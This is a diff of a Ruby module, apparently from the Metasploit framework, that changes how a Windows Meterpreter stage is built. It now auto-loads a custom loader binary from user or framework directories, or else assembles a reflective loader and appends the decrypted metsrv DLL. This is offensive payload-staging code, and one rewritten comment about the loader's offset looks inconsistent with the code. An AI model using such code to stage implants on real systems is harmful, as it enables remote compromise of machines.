@@ -29,9 +29,6 @@ module Payload::Windows::MeterpreterLoader
       'PayloadCompat' => { 'Convention' => 'sockedi handleedi -https', },
       'Stage'         => { 'Payload'   => "" }
       ))
-      register_advanced_options([
-        OptBool.new('MeterpreterLoader::CustomLoader', [ false, 'Use a custom loader', false ]),
-      ], self.class)
   end
 
   def asm_invoke_metsrv(opts={})
@@ -106,28 +103,37 @@ module Payload::Windows::MeterpreterLoader
   def stage_meterpreter(opts={})
     ds = opts[:datastore] || datastore
     debug_build = ds['MeterpreterDebugBuild']
-    custom_loader = ds['MeterpreterLoader::CustomLoader'] == true
 
-    loader = reflective_loader()
-    if custom_loader
-      custom_loader_path = ::File.join(Msf::Config.data_directory, 'meterpreter', 'custom_loader.x86.bin')
-      unless ::File.exist?(custom_loader_path)
-        print_status("Custom loader not found at #{custom_loader_path}, drop your loader there and try again.")
-        raise RuntimeError, "Custom loader not found at #{custom_loader_path}"
-      end
+    # Prefer a site-local custom loader binary if the user has dropped one into
+    # the meterpreter search paths (~/.msf4/user_data/meterpreter/ or
+    # <msf>/data/meterpreter/); otherwise assemble the polymorphic reflective
+    # loader on the fly.
+    custom_loader_path = [
+      ::MetasploitPayloads.user_meterpreter_dir,
+      ::MetasploitPayloads.msf_meterpreter_dir
+    ].map { |dir| ::File.join(dir, 'custom_loader.x86.bin') }.find { |p| ::File.readable?(p) }
+
+    if custom_loader_path
+      ::MetasploitPayloads.warn_local_path(custom_loader_path)
       loader = ::File.binread(custom_loader_path)
+    else
+      begin
+        loader = reflective_loader
+      rescue Msf::Payload::Windows::ReflectiveLoaderCommon::Error => e
+        elog('Reflective loader generation failed', error: e)
+        raise
+      end
     end
     dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: ::File.binread(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll', debug: debug_build)))
     asm_opts = {
-        rdi_offset: dll.length, # we will append the dll to the end of the custom loader, so the offset to it is just the length of the custom loader
-        length:     dll.length + loader.length, # the total length of the payload is the length of the custom loader + the dll
+        rdi_offset: dll.length, # the reflective loader is appended to the end of the DLL, so its offset within the payload equals the DLL length
+        length:     dll.length + loader.length, # total payload length = DLL + reflective loader
         stageless:  opts[:stageless] == true
       }
-    puts("WARNING: Local file #{custom_loader_path} is being used") if custom_loader
-    vprint_status("Loader length: #{loader.length} bytes")
-    vprint_status("DLL length: #{dll.length} bytes")
-    vprint_status("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
-    vprint_status("Configuration offset: #{asm_opts[:length]} bytes")
+    dlog("Loader length: #{loader.length} bytes")
+    dlog("DLL length: #{dll.length} bytes")
+    dlog("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
+    dlog("Configuration offset: #{asm_opts[:length]} bytes")
     asm = asm_invoke_metsrv(asm_opts)
 
     # generate the bootstrap asm
